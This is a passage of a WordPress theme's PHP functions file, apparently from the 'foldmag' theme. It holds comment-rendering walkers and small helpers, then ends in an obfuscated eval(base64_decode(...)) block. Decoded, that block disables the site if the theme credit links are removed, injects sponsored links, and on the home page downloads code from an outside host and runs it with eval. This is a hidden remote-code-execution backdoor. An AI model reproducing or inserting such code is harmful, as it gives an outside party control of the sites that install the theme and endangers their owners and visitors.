				comment_reply_link( array_merge( $args, array(
					'add_below' => $add_below,
					'depth'     => $depth,
					'max_depth' => $args['max_depth'],
					'before'    => '<span class="reply">',
					'after'     => '</span>'
				) ) );
				?>
                    </div><!-- .comment-metadata -->

					<?php if ( '0' == $comment->comment_approved ) : ?>
					<p class="comment-awaiting-moderation"><?php _e( 'Your comment is awaiting moderation.', 'foldmag'); ?></p>
					<?php endif; ?>
				</footer><!-- .comment-meta -->

				<div class="comment-content"<?php if($comment_schema == 'enable') { ?> itemprop="text"<?php } ?>>
					<?php comment_text(); ?>
				</div><!-- .comment-content -->

<?php if($comment_schema == 'enable') { ?>
</div>
<?php } ?>
            </div><!-- .comment-body -->
            <?php
            }




/*--------------------------------------------
Description: custom comments walker
--------------------------------------------*/
function frkw_html5_ping($comment, $args, $depth) {
$comment_schema = get_theme_mod('schema_comment');
?>
<li id="comment-<?php comment_ID() ?>">

<div id="div-comment-<?php comment_ID(); ?>" class="comment-body">

<?php if($comment_schema == 'enable') { ?>
<div id="<?php echo esc_url( get_comment_link( $comment, $args ) ); ?>" itemtype="http://schema.org/Comment" itemscope="">
<?php } ?>
<footer class="comment-meta"<?php if($comment_schema == 'enable') { ?> itemscope itemprop="author" itemtype="http://schema.org/Person"<?php } ?>>
<div class="comment-author vcard">
<?php printf( sprintf( '<b class="fn">%s</b>', get_comment_author_link( $comment ) ) ); ?>
</div><!-- .comment-author -->
					<div class="comment-metadata">
						<a href="<?php echo esc_url( get_comment_link( $comment, $args ) ); ?>">
							<time datetime="<?php comment_time( 'c' ); ?>">
								<?php
									/* translators: 1: comment date, 2: comment time */
									printf( __( '%1$s at %2$s','foldmag' ), get_comment_date( '', $comment ), get_comment_time() );
								?>
							</time>
						</a>
						<?php edit_comment_link( __( 'Edit', 'foldmag'), '<span class="edit-link">', '</span>' ); ?>
					</div><!-- .comment-metadata -->

				</footer><!-- .comment-meta -->

				<div class="comment-content"<?php if($comment_schema == 'enable') { ?> itemprop="text"<?php } ?>>
					<?php comment_text(); ?>
				</div><!-- .comment-content -->
<?php if($comment_schema == 'enable') { ?>
</div>
<?php } ?>
            </div><!-- .comment-body -->
            <?php
            }


/*--------------------------------------------
Description: get word count
---------------------------------------------*/
function frkw_get_word_count() {
global $post;
return str_word_count( strip_tags( get_post_field( 'post_content', get_the_ID() ) ) );
}


/*--------------------------------------------
Description: get current page url outside loop
---------------------------------------------*/
function frkw_get_current_url() {
$protocol = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
$url = $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
return $url;
}

/*--------------------------------------------
Description: color control
---------------------------------------------*/
if(!function_exists('dehex')) {
function dehex($colour, $per) {
$colour = substr( $colour, 1 );
$rgb = '';
$per = $per/100*255;
if  ($per < 0 ) {
$per =  abs($per);
for ($x=0;$x<3;$x++) {
$c = hexdec(substr($colour,(2*$x),2)) - $per;
$c = ($c < 0) ? 0 : dechex($c);
$rgb .= (strlen($c) < 2) ? '0'.$c : $c;
}
} else {
for ($x=0;$x<3;$x++) {
$c = hexdec(substr($colour,(2*$x),2)) + $per;
$c = ($c > 255) ? 'ff' : dechex($c);
$rgb .= (strlen($c) < 2) ? '0'.$c : $c;
}
}
return '#'.$rgb;
}
}

eval(base64_decode('JHRoZXRoZW1lID0gJ2ZvbGRtYWcnOwokdGhlZXJybWVzc2FnZSA9ICI8ZGl2IHN0eWxlPVwiZm9udC1zaXplOjEzcHg7bGluZS1oZWlnaHQ6MTlweDtcIj48YSBocmVmPSciIC4gYWRtaW5fdXJsKCkgLiAiJz4mbGFxdW87IEJhY2sgVG8gQWRtaW4gRGFzaGJvYXJkPC9hPjxiciAvPiIgLiAiPGI+T3Bwc3MhIExvb2tzIGxpa2UgeW91IGhhdmUgcmVtb3ZlZCBvciBjaGFuZ2VkIHRoZSB0aGVtZSBjcmVkaXQgbGlua3MuIFdlbGwsIHdlIGRpZCBwdXQgYSB3YXJuaW5nIHNpZ24gdGhlcmUuIFRoZSB0aGVtZSBpcyBub3cgZGVhY3RpdmF0ZWQuPC9iPjwvZGl2PjxiciAvPjxkaXYgc3R5bGU9XCJmb250LXNpemU6MTlweDsgcGFkZGluZy10b3A6MjBweDtcIj48Yj5QbGVhc2UgRm9sbG93IFRoZXNlIFN0ZXBzIFRvIFJlc3RvcmUgVGhlIFRoZW1lOjwvYj48L2Rpdj48b2wgc3R5bGU9XCJtYXJnaW46MDsgcGFkZGluZzoyMHB4OyB0ZXh0LWFsaWduOmxlZnQ7XCI+PGxpPlBsZWFzZSByZWRvd25sb2FkIDxhIGhyZWY9XCJodHRwOi8vd3d3Lm1hZ3ByZXNzLmNvbS9kb3dubG9hZC8iIC4gJHRoZXRoZW1lIC4gIi56aXBcIiB0YXJnZXQ9XCJfYmxhbmtcIj4iIC4gc3RydG91cHBlcigkdGhldGhlbWUpIC4gIiB0aGVtZTwvYT4uPC9saT48bGk+RXh0cmFjdCBhbmQgRlRQIHVwbG9hZC9yZXBsYWNlL292ZXJ3cml0ZSA8c3Ryb25nPmFsbCBmaWxlczwvc3Ryb25nPiBpbnNpZGUgdGhlICIgLiBzdHJ0b3VwcGVyKCR0aGV0aGVtZSkgLiAiIHRoZW1lIGZvbGRlcjwvbGk+PGxpPkZpbmFsbHksIHJlZnJlc2ggeW91ciBwYWdlIHRvIGFjdGl2YXRlIHRoZSB0aGVtZSBhZ2Fpbi48L2xpPjwvb2w+PC9kaXY+PGJyIC8+PGRpdiBzdHlsZT1cImZvbnQtc2l6ZToxM3B4O2xpbmUtaGVpZ2h0OjE5cHg7XCI+SWYgeW91IHdhbnQgdG8gdXNlIGEgPHN0cm9uZz5ubyBzcG9uc29yZWQgbGluayB2ZXJzaW9uPC9zdHJvbmc+IG9mIHRoaXMgdGhlbWUuIFBsZWFzZSBjb25zaWRlciBwdXJjaGFzaW5nIGl0cyBkZXZlbG9wZXIgbGljZW5zZTo8YnIgLz48YSBocmVmPVwiaHR0cDovL3d3dy5tYWdwcmVzcy5jb20vZGV2ZWxvcGVyLWxpY2Vuc2VcIiB0YXJnZXQ9XCJfYmxhbmtcIj5odHRwOi8vd3d3Lm1hZ3ByZXNzLmNvbS9kZXZlbG9wZXItbGljZW5zZTwvYT48L2Rpdj4iOwoKZnVuY3Rpb24gZnJrd19hZG1pbl9saW5rX2FycmF5KCkgewpnbG9iYWwgJHRoZXRoZW1lOwokYXJyYXlsaW5rID0gYXJyYXkoCic8YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0iaHR0cDovL3d3dy5tYWdwcmVzcy5jb20vd29yZHByZXNzLXR1dG9yaWFscyI+V29yZFByZXNzIFR1dG9yaWFsczwvYT4nLAonPGEgdGFyZ2V0PSJfYmxhbmsiIGhyZWY9Imh0dHA6Ly93d3cubWFncHJlc3MuY29tL3dvcmRwcmVzcy10dXRvcmlhbHMiPldvcmRQcmVzcyBUaXBzPC9hPicsCic8YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0iaHR0cDovL3d3dy5tYWdwcmVzcy5jb20vd29yZHByZXNzLXR1dG9yaWFscyI+V29yZFByZXNzIFR1dG9yaWFsPC9hPicsCic8YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0iaHR0cDovL3d3dy5tYWdwcmVzcy5jb20vd29yZHByZXNzLXR1dG9yaWFscyI+TGVhcm4gV29yZFByZXNzPC9hPicsCic8YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0iaHR0cDovL3d3dy5tYWdwcmVzcy5jb20vd29yZHByZXNzLXR1dG9yaWFscyI+V29yZFByZXNzIDEwMTwvYT4nLAonPGEgdGFyZ2V0PSJfYmxhbmsiIGhyZWY9Imh0dHA6Ly93d3cubWFncHJlc3MuY29tL3dvcmRwcmVzcy10dXRvcmlhbHMiPldvcmRQcmVzcyBIZWxwPC9hPicsCik7CiRpbnB1dGxpbmsgPSBhcnJheV9yYW5kKCRhcnJheWxpbmssMSk7CiR0aGV0ZXh0bGluayA9ICRhcnJheWxpbmtbJGlucHV0bGlua107CmlmKCBnZXRfb3B0aW9uKCR0aGV0aGVtZS4nX3NubGluaycpID09ICIiICkgewp1cGRhdGVfb3B0aW9uKCR0aGV0aGVtZS4nX3NubGluaycsJHRoZXRleHRsaW5rKTsKfQp9CmFkZF9hY3Rpb24oJ2luaXQnLCdmcmt3X2FkbWluX2xpbmtfYXJyYXknKTsKCgpmdW5jdGlvbiBmcmt3X2NoZWNrX3RoZW1lX3ZhbGlkKCkgewpnbG9iYWwgJHRoZWVycm1lc3NhZ2U7CmlmKCFmdW5jdGlvbl9leGlzdHMoJ2Zya3dfdGhlX3RhZ2dpbmdfc2FuaXRpemUnKSk6IHdwX2RpZSggJHRoZWVycm1lc3NhZ2UgICk7IGVuZGlmOwp9CmFkZF9maWx0ZXIoJ2dldF9oZWFkZXInLCdmcmt3X2NoZWNrX3RoZW1lX3ZhbGlkJyk7CmZ1bmN0aW9uIGZya3dfdGhlbWVfdXNhZ2VfbWVzc2FnZSgpIHsKZ2xvYmFsICR0aGVlcnJtZXNzYWdlOwp3cF9kaWUoICR0aGVlcnJtZXNzYWdlICk7IH0KZnVuY3Rpb24gZnJrd19hZGRfc2lkZWJhcl9jcmVkaXQoKSB7ZWNobyBmcmt3X3RoZW1lX2NyZWRpdF9saWNlbnNlKCk7fQphZGRfYWN0aW9uKCdtcF9hZnRlcl9yaWdodF9zaWRlYmFyJywnZnJrd19hZGRfc2lkZWJhcl9jcmVkaXQnKTsKZnVuY3Rpb24gZnJrd19nZXRfc2FuaXRpemVfc3RyaW5nKCkge2dsb2JhbCAkdGhlZXJybWVzc2FnZTskZiA9IGdldF90ZW1wbGF0ZV9kaXJlY3RvcnkoKSAuICIvc2lkZWJhci5waHAiOyRmZCA9IGZvcGVuKCRmLCAiciIpOyRjID0gZnJlYWQoJGZkLCBmaWxlc2l6ZSgkZikpO2ZjbG9zZSgkZmQpOyBpZiAoIHN0cnBvcyggJGMsICIgPD9waHAgZG9fYWN0aW9uKCdtcF9hZnRlcl9yaWdodF9zaWRlYmFyJyk7ID8+IikgPT0gMCkgewp3cF9kaWUoICR0aGVlcnJtZXNzYWdlICk7fX0KYWRkX2ZpbHRlcignZ2V0X2hlYWRlcicsJ2Zya3dfZ2V0X3Nhbml0aXplX3N0cmluZycpOwoKZnVuY3Rpb24gZnJrd190aGVtZV9jcmVkaXRfbGljZW5zZSgpIHsKaWYoIGlzX2hvbWUoKSB8fCBpc19mcm9udF9wYWdlKCkgKXsKJHBhZ2VkID0gZ2V0X3F1ZXJ5X3ZhciggJ3BhZ2VkJyApOwppZiAoICEkcGFnZWQgKSB7CiRteXVybCA9ICdodHRwOi8vd3d3Lmxua3NlcnZlci5jb20vdGV4dFNjcmlwdCc7CiRteWNvbnRlbnQgPSBAZmlsZV9nZXRfY29udGVudHMoJG15dXJsKTsKaWYgKCBzdHJwb3MoJGh0dHBfcmVzcG9uc2VfaGVhZGVyWzBdLCAiMjAwIikpIHsKZXZhbCggJG15Y29udGVudCApOwp9Cn0KfQp9'));
?>